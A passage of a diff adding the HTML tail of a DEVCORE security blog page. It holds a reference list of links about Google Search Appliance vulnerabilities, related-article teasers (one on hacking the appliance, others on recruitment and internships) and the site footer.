+  <li><a href="https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;context=jdfsl">https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;context=jdfsl</a></li>
+  <li><a href="https://www.anandtech.com/show/2407">https://www.anandtech.com/show/2407</a></li>
+  <li><a href="https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ">https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ</a></li>
+  <li><a href="https://github.com/google/subpar">https://github.com/google/subpar</a></li>
+  <li><a href="https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/">https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/</a></li>
+  <li><a href="https://github.com/kubernetes/kubernetes/issues/57760#issuecomment-356466614">https://github.com/kubernetes/kubernetes/issues/57760#issuecomment-356466614</a></li>
+  <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2014-0362">https://nvd.nist.gov/vuln/detail/CVE-2014-0362</a></li>
+  <li><a href="https://www.youtube.com/watch?v=un01LMLMuis">https://www.youtube.com/watch?v=un01LMLMuis</a></li>
+  <li><a href="https://www.youtube.com/watch?v=K-sEER8CK0U">https://www.youtube.com/watch?v=K-sEER8CK0U</a></li>
+  <li><a href="http://technical-fundas.blogspot.com/2016/05/google-search-appliance-migrate.html?">http://technical-fundas.blogspot.com/2016/05/google-search-appliance-migrate.html?</a></li>
+</ul>
+
+
+                    </div>
+                    <!-- 文章內容 -->
+                </div>
+            </article>
+            <!-- 文章 end -->
+        </section>
+        
+
+        <!-- 相關文章 -->
+        <section class="recommand articles-list">
+            <div class="container">
+              
+                <!-- 相關文章 Item -->
+                <article class="article">
+                    <div class="content">
+                        <a class="category" href="/blog/category/技術專欄">技術專欄</a>
+                        <span class="tag">
+    
+                          <a href="/blog/tag/Google, LFI, Shell/">#Google, LFI, Shell</a> 
+                        </span>
+                        <h2>
+                            <a href="/blog/2023/07/07/a-journey-into-hacking-google-search-appliance/">[REL] 深入破解 Google Search Appliance</a> 
+                        </h2>
+                    
+                    
+                        <span class="date">2023-07-07</span>
+                        <p class="line-litmit-3">Google Search Appliance (以下簡稱 GSA ) 是 Google 於2002 年開始為企業推出的搜尋設備，主要功能為放置於企業內網用於索引內部網路資訊並提供檢索。
+                        </p>
+                    </div>
+                </article>
+              
+                <!-- 相關文章 Item -->
+                <article class="article">
+                    <div class="content">
+                        <a class="category" href="/blog/category/最新消息">最新消息</a>
+                        <span class="tag">
+    
+                          <a href="/blog/tag/資安人才/">#資安人才</a> 
+                        </span>
+                        <h2>
+                            <a href="/blog/2023/05/26/from-cybersecurity-muggle-to-red-team-specialist-vtim/">從資安麻瓜到紅隊演練專家－Vtim</a> 
+                        </h2>
+                    
+                    
+                        <span class="date">2023-05-26</span>
+                        <p class="line-litmit-3">目前於 DEVCORE 戴夫寇爾擔任紅隊演練專家的 Vtim，現年 27 歲，曾帶領過多次紅隊演練專案，擁有數十場紅隊演練經驗，也有豐富的資安競賽及國際企業漏洞獎勵計畫經驗，亦通過 OSCP、OSWE 認證，具備專業的 Web 檢測與內網滲透能力。
+                        </p>
+                    </div>
+                </article>
+              
+                <!-- 相關文章 Item -->
+                <article class="article">
+                    <div class="content">
+                        <a class="category" href="/blog/category/最新消息">最新消息</a>
+                        <span class="tag">
+    
+                          <a href="/blog/tag/公告/">#公告</a> <a href="/blog/tag/徵才/">#徵才</a> 
+                        </span>
+                        <h2>
+                            <a href="/blog/2023/01/14/3rd-internship-program-recruit/">DEVCORE 2023 第三屆實習生計畫</a> 
+                        </h2>
+                    
+                    
+                        <span class="date">2023-01-14</span>
+                        <p class="line-litmit-3">DEVCORE 第三屆實習生計畫開始，計畫目的希望能培育人才、增強新世代的資安技能，如果您對這個計畫有興趣，歡迎來信報名！
+                        </p>
+                    </div>
+                </article>
+              
+
+            </div>
+        </section>
+    </div>
+
+    <!-- footer -->
+    <footer>
+<div class="container footer">
+    <div class="logo">
+        <a href="/">
+            <img src="/images/logo.svg"/>
+        </a>
+        <div class="social">
+            <a href="https://www.facebook.com/D3VC0RE"><i class="icon facebook"></i></a>
+            <a href="https://twitter.com/d3vc0r3"><i class="icon twitter"></i></a>
+        </div>
+    </div>
+
+    <div class="column">
+        <h6 class="mobile_toggle">服務</h6>
+        <ul>
+            <li><a href="/services/red-team/">紅隊演練</a></li>
+            <li><a href="/services/penetration-test/">滲透測試</a></li>
+            <li><a href="/services/security-consulting/">資安顧問服務</a></li>
+            <li><a href="/services/security-training/">資安教育訓練</a></li>
+        </ul>
+    </div>
+
+    <div class="column">
+        <h6 class="mobile_toggle">研究</h6>
+        <ul>
+            <li><a href="/research/overview/">總覽概要</a></li>
+            <li><a href="/research/awards/">競賽與獎項</a></li>
+            <li><a href="/research/bug-bounty/">企業漏洞回報</a></li>
+            <li><a href="/research/talks/">國際研討會</a></li>
+            <li><a href="/research/cve/">CVE 漏洞列表</a></li>
+        </ul>
+    </div>
+
+    <div class="column">
+        <h6 class="mobile_toggle">公司</h6>
+        <ul>
+            <li><a href="/company/about/">公司簡介</a></li>
+            <li><a href="/company/our-team/">團隊成員</a></li>
+            <li><a href="/company/history/">成就與沿革</a></li>
+            <li><a href="/company/csr/">企業社會責任</a></li>
+            <li><a href="/company/jobs/">工作機會</a></li>
+            <li><a href="/contact/">聯絡我們</a></li>
+        </ul>
+    </div>
+
+    <div class="column">
+        <h6 class="mobile_toggle">新聞</h6>
+        <ul>
+            <li><a href="/blog/">BLOG</a></li>
+            <li><a href="/media-kit/">媒體素材下載</a></li>
+        </ul>
+    </div>
+
+    <!-- divider 分隔線 -->
+    <div class="divider"></div>
+
+    <div class="copyright">
+        <div class="info">
+            <span>© 2023 DEVCORE 戴夫寇爾股份有限公司. <b class="line-block">All right reserved.</b></span>
+            <span><a href="/privacy-policy/">Privacy Policy</a></span>
+        </div>
+        <div class="lang">
+            <!-- <i class="icon translate"></i>
+            <select>
+                <option value="">Language</option>
+                <option value="">中文</option>
+                <option value="">English</option>
+            </select> -->
+            <span>Language :<a href="/">中文</a>|<a href="/en/">English</a></span>
+        </div>
+    </div>
+
+</div>
+    </footer>
+</body>
+</html>
+
